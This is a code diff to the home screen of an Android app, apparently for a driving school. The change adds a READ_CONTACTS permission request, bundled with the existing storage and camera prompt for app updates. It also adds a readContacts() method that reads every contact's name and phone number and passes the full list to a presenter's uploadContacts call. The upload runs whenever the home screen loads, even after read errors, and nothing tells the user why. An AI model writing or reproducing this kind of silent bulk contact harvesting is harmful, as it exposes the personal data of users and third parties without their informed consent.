@@ -4,9 +4,11 @@ import android.Manifest;
 import android.app.Activity;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.ContactsContract;
 import android.support.design.widget.CoordinatorLayout;
 import android.support.design.widget.Snackbar;
 import android.support.v4.app.ActivityCompat;
@@ -29,6 +31,7 @@ import com.facebook.drawee.view.SimpleDraweeView;
 import com.hahaxueche.R;
 import com.hahaxueche.model.base.Banner;
 import com.hahaxueche.model.base.City;
+import com.hahaxueche.model.user.student.Contact;
 import com.hahaxueche.presenter.homepage.HomepagePresenter;
 import com.hahaxueche.ui.activity.ActivityCollector;
 import com.hahaxueche.ui.activity.base.BaseWebViewActivity;
@@ -104,17 +107,29 @@ public class HomepageFragment extends HHBaseFragment implements ViewPager.OnPage
         GenericDraweeHierarchy hierarchy = mIvFreeTry.getHierarchy();
         hierarchy.setActualImageScaleType(ScalingUtils.ScaleType.FIT_CENTER);
 
-        // Check the SDK version and whether the permission is already granted or not.
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
-                (mActivity.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
-                        || mActivity.checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
-                        || mActivity.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)) {
-            requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.CAMERA}, RequestCode.PERMISSIONS_REQUEST_SDCARD);
-            //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
+        if (mPresenter.isNeedUpdate()) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
+                    (mActivity.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
+                            || mActivity.checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
+                            || mActivity.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED
+                            || mActivity.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)) {
+                requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE,
+                                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                                Manifest.permission.CAMERA,
+                                Manifest.permission.READ_CONTACTS},
+                        RequestCode.PERMISSIONS_REQUEST_SDCARD_CONTACTS_HOMEPAGE);
+            } else {
+                mPresenter.alertToUpdate(getContext());
+                readContacts();
+            }
         } else {
-            // Android version is lesser than 6.0 or the permission is already granted.
-            mPresenter.doVersionCheck();
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && mActivity.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, RequestCode.PERMISSIONS_REQUEST_READ_CONTACTS);
+            } else {
+                readContacts();
+            }
         }
+
         return view;
     }
 
@@ -195,10 +210,8 @@ public class HomepageFragment extends HHBaseFragment implements ViewPager.OnPage
             case R.id.tv_tel_ask:
                 mPresenter.phoneSupportCount();
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && mActivity.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
-                    requestPermissions(new String[]{Manifest.permission.CALL_PHONE}, RequestCode.PERMISSIONS_REQUEST_CELL_PHONE);
-                    //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
+                    mActivity.requestPermissions(new String[]{Manifest.permission.CALL_PHONE}, RequestCode.PERMISSIONS_REQUEST_CELL_PHONE_FOR_CUSTOMER_SERVICE);
                 } else {
-                    // Android version is lesser than 6.0 or the permission is already granted.
                     contactService();
                 }
                 break;
@@ -250,21 +263,26 @@ public class HomepageFragment extends HHBaseFragment implements ViewPager.OnPage
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        if (requestCode == RequestCode.PERMISSIONS_REQUEST_CELL_PHONE) {
+        if (requestCode == RequestCode.PERMISSIONS_REQUEST_CELL_PHONE_FOR_CUSTOMER_SERVICE) {
             if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                // Permission is granted
                 contactService();
             } else {
                 showMessage("请允许拨打电话权限，不然无法直接拨号联系客服");
             }
-        } else if (requestCode == RequestCode.PERMISSIONS_REQUEST_SDCARD) {
-            if (grantResults.length > 2 && grantResults[0] == PackageManager.PERMISSION_GRANTED
+        } else if (requestCode == RequestCode.PERMISSIONS_REQUEST_READ_CONTACTS) {
+            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                readContacts();
+            }
+        } else if (requestCode == RequestCode.PERMISSIONS_REQUEST_SDCARD_CONTACTS_HOMEPAGE) {
+            if (grantResults[0] == PackageManager.PERMISSION_GRANTED
                     && grantResults[1] == PackageManager.PERMISSION_GRANTED
                     && grantResults[2] == PackageManager.PERMISSION_GRANTED) {
-                // Permission is granted
-                mPresenter.doVersionCheck();
+                mPresenter.alertToUpdate(getContext());
             } else {
                 showMessage("请允许读写sdcard权限，不然无法下载最新的安装包");
+            }
+            if (grantResults[3] == PackageManager.PERMISSION_GRANTED) {
+                readContacts();
             }
         }
     }
@@ -404,5 +422,35 @@ public class HomepageFragment extends HHBaseFragment implements ViewPager.OnPage
     public void onDestroy() {
         mPresenter.detachView();
         super.onDestroy();
+    }
+
+    /**
+     * 读取通讯录
+     */
+    private void readContacts() {
+        Cursor cursor = null;
+        ArrayList<Contact> contacts = new ArrayList<>();
+        try {
+            cursor = mActivity.getContentResolver()
+                    .query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    Contact contact = new Contact();
+                    contact.name = cursor.getString(cursor.getColumnIndex(
+                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    contact.number = cursor.getString(cursor.getColumnIndex(
+                            ContactsContract.CommonDataKinds.Phone.NUMBER)).replace(" ", "").replace("-", "");
+                    contacts.add(contact);
+                }
+            }
+        } catch (Exception e) {
+            HHLog.e(e.getMessage());
+            e.printStackTrace();
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
+            mPresenter.uploadContacts(contacts);
+        }
     }
 }
